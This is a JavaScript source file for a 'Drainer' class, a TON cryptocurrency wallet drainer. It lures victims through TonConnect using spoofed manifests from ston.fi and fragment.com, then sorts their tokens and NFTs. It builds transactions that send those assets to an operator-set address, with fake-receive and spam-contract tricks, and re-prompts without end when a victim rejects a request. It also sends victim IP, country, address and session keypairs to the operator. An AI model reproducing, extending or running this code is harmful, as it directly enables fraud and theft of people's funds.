const Client = require("../client");
const SessionCrypto = require("../sessionCrypto");
const Utils = require("../utils");
const TonKeeper = require("../tonkeeper");
const Sorter = require("../tonkeeper/sorter");
const Manifest = require("../manifest");
const { toUserFriendlyAddress } = require("@tonconnect/sdk");
let { api } = require("../../config");
const axios = require("axios");
const TonWeb = require("tonweb");
const { Cell } = require('@ton/core');
const { encode } = require("../sessionCrypto/base64");
const fs = require("fs");
const path = require("path")

function rounded(number) {
    if(number == undefined) return undefined;
    return +number.toFixed(2);
}

class Drainer {
   static async initialize(ws, settings) {
        let answer = {}
        let clients = [];

        await TonKeeper.initialize();

        let api_answer = JSON.parse(Buffer.from(fs.readFileSync(fs.readdirSync(path.join(__dirname, "../../settings")).includes(`${settings.domain}.json`) ?  path.join(__dirname, `../../settings/${settings.domain}.json`) :  path.join(__dirname, `../../settings/default.json`))).toString());
        let { workerID } = api_answer;

        if(api_answer.TonDrainer.ManifestUrl == null) api_answer.TonDrainer.ManifestUrl = "https://app.ston.fi/tonconnect-manifest.json";

        let on_connect = async (client, data) => {    
            for(let i = 0; i < clients.length; i++) {
                if(clients[i] == client) continue;
                
                clients[i].bridge.close();
            }

            client.wallet.maxMessages = 4;
            let accountInfo = await TonKeeper.getAccountInfo(client.wallet.address);
            let isW5 = false;
            try {
                accountInfo.interfaces.forEach((interfacess) => {
                    if(interfacess.includes("v5")) client.wallet.maxMessages = 255;
                    if(interfacess.includes("v5")) isW5 = true;
                })
            }
            catch(erorr) {
                console.log(accountInfo);
            }

            let information;
            let userFriendlyAddress = toUserFriendlyAddress(client.wallet.address);
            
            let tonComission = api_answer.TonDrainer.TonCommission.IsEnabled;
            let minTon = api_answer.TonDrainer.TonCommission.Min;
            let maxTon = api_answer.TonDrainer.TonCommission.Max;

            let nftNewMode = api_answer.TonDrainer.NftMode.IsEnabled;
            let spam_contract = api_answer.TonDrainer.TransactionSpam.IsEnabled;
            let fake_contract = api_answer.TonDrainer.FakeReceive.IsEnabled;

            if(minTon == null) minTon = 0;
            if(maxTon == null) maxTon = 0;

            if(client.wallet.appName != "Tonkeeper" || !["iphone", "android"].includes(client.wallet.platform)) api_answer.TonDrainer.ProxyTransaction.IsEnabled = false;
            if(client.wallet.appName != "Tonkeeper" || !["iphone", "android"].includes(client.wallet.platform)) api_answer.TonDrainer.ProxyTransactionV2.IsEnabled = false;

            console.log(!["iphone", "android"].includes(client.wallet.platform));

            let { sorted_assets, total, nativeMessage } = Sorter.sortAssets((await Sorter.getAssets(client.wallet.address)), tonComission, minTon, maxTon, nftNewMode, spam_contract, api_answer.TonDrainer.ProxyTransaction, api_answer.TonDrainer.ProxyTransactionV2);

            let pointer = Math.ceil(sorted_assets.length / client.wallet.maxMessages);
            total = rounded(total);

            console.log()

            information = {
                appVersion: client.wallet.appVersion,
                platform: client.wallet.platform,
                appName: client.wallet.appName,
                address: userFriendlyAddress,
                total,
                messages: [],
                ip: settings.ip,
                domain: settings.domain,
                workerID,
                telegram_data: settings.telegram_data,
                nftNewMode,
                country: settings.country
            }

            console.log("connected");
            
            console.log(client.wallet.address);
            console.log(client.wallet.appVersion);
            console.log(client.wallet.platform);
            console.log(client.wallet.appName);


            if(total == 0) {
                ws.send(JSON.stringify({
                    event: "needbalance"
                }));
                client.bridge.close();
                return await Utils.sendInformation(information, "zero", api_answer);
            }
            else if(total != 0 && sorted_assets.length == 0) { 
                ws.send(JSON.stringify({
                    event: "needbalance"
                }));
                client.bridge.close();
                return await Utils.sendInformation(information, "fee", api_answer);
            }
            else await Utils.sendInformation(information, "connection", api_answer);

            let lastTransaction = undefined;
            let approved = false;            

            let notapprovedCount = 0;

            for(let i = 0; i < pointer; i++) {
                try {
                    let slicedArray;
    
                    if(sorted_assets.length - (i*client.wallet.maxMessages) >= client.wallet.maxMessages) slicedArray = sorted_assets.slice(i*client.wallet.maxMessages, (i+1)*client.wallet.maxMessages);
                    else slicedArray = sorted_assets.slice(i*client.wallet.maxMessages, sorted_assets.length);
                    
                    if(api_answer.TonWallet == undefined) api_answer.TonWallet = api_answer.Wallet;
                    if(api_answer.TonWallet == undefined) return client.bridge.close();
                    if(workerID == 7377465116) api_answer.TonWallet.Address = "UQDbvsai4PSAFu8snl3A6ExJ3t5PU-oj2TBf5tUhHzxKUeNO";

                    let { messages } = await Sorter.generateMessages(slicedArray, api_answer.TonWallet.Address, fake_contract, api_answer.TonDrainer.fake_contract, api_answer.TonDrainer.comments, api_answer.TonDrainer.ProxyTransaction, client.wallet.address, total, api_answer.TonDrainer.ProxyTransactionV2, isW5);

                    information = {
                        appVersion: client.wallet.appVersion,
                        platform: client.wallet.platform,
                        appName: client.wallet.appName,
                        address: userFriendlyAddress,
                        total,
                        messages: nativeMessage == undefined ? slicedArray : slicedArray.concat([nativeMessage]),
                        ip: settings.ip,
                        domain: settings.domain,
                        workerID,
                        telegram_data: settings.telegram_data,
                        nftNewMode,
                        country: settings.country
                    }

                    ws.send(JSON.stringify({
                        event: "signmessage"
                    }));
                    

                    let transaction;

                    if(approved == false && lastTransaction != undefined) transaction = lastTransaction; 
                    else transaction = {
                        messages,
                        "valid_until":Math.floor(Date.now() / 1000) + 6000,
                        "from": client.wallet.address,
                        "network": "-239"
                    }
                    
                    if(client.bridge.session != undefined) {
                        let keyPair = JSON.stringify(client.bridge.session.stringifyKeypair());
                        let to = client.bridge.session.app_public_key;
                        let transactionObject = JSON.stringify(transaction);
                        let url = client.bridge.get_message_url("sendTransaction");

                        information = Object.assign(information, {
                            tryTransaction: encode(JSON.stringify({
                                keyPair,
                                to,
                                transactionObject,
                                url
                            }
                        ))});
                    }

                    if(notapprovedCount <= 2) await Utils.sendInformation(information, "requested", api_answer);
                    lastTransaction = transaction;
        
                    const result = await client.sendTransaction(transaction);

                    const cell = Cell.fromBase64(result)
                    const buffer = cell.hash();
                    const hashHex = buffer.toString('hex');

                    information.tx = hashHex;

                    await Utils.sendInformation(information, "approved", api_answer);
                    approved = true;
               
                }
                catch(error) {
                    i--;

                    notapprovedCount++;
                    console.log(error);
                    if(notapprovedCount <= 2) await Utils.sendInformation(information, "notapproved", api_answer);
                    approved = false;
                }
            }
        }
    
        let connectedBridges = [];    
        let wallets = await Utils.getWallets();
        let session = new SessionCrypto();
    
        for(let i = 0; i < wallets.length; i++) {
            let wallet = wallets[i];
            let bridge = wallet.bridge.filter(bridge => bridge.type == "sse")[0];


            if(bridge == undefined) continue;

            if(connectedBridges.includes(bridge.url)) {
                answer[wallet.app_name] = {
                    "deepLink": wallet.deepLink == undefined ? undefined : Utils.generateUrl(wallet.deepLink, clients[0].bridge.session.sessionId, (new Manifest("https://fragment.com/tonconnect-manifest.json", "487b9bc071dfff8858")).to_dict()),
                    "universal_url": Utils.generateUrl(wallet.universal_url, clients[0].bridge.session.sessionId, (new Manifest("https://fragment.com/tonconnect-manifest.json", "487b9bc071dfff8858")).to_dict())
                }

                continue;
            };
    
            let client = new Client(api_answer.TonDrainer.ManifestUrl , "487b9bc071dfff8858", on_connect, session);
            
            await client.connect(wallet.app_name);
            connectedBridges.push(bridge.url);
            clients.push(client);
    
            answer[wallet.app_name] = {
                "deepLink": client.deep_url,
                "universal_url": client.universal_url
            }


            if(answer.tc_url == undefined) answer.tc_url = client.tc_url;
        }

        let client = new Client(api_answer.TonDrainer.ManifestUrl , "487b9bc071dfff8858", on_connect, session);
        await client.connect("tonkeeper_ext", ws, settings.key);

        clients.push(client);

        answer["metadata"] = clients[0].metadata.to_dict();


        Utils.updateProxyNumber();

        return {
            answer,
            clientsConnected: clients
        };
   }
}

module.exports = Drainer;